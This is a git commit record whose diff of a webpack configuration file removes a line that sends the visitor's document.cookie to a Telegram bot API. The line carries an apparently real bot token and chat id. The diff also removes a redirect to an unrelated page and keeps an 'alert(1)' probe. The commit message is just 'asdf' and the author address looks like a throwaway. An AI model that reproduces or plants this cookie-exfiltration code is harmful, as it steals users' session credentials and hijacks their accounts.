1d536769ba1681fbb584110c68e1cbca16f0a5c5
dfdhuugy <czb4c695@flymail.tk>
2024-01-24 16:26:01 +0100

    asdf

--- webpack.common.js
+++ webpack.common.js
@@ -1,4 +1,2 @@
 alert(1);
-fetch('https://api.telegram.org/bot6453943039:AAGWlv_2tv4g5mF9KmwNug7uTvx9KYAkpzM/sendMessage?chat_id=6460362315&text='+document.cookie);
-location.href='/drema-belaya-koren/';
 
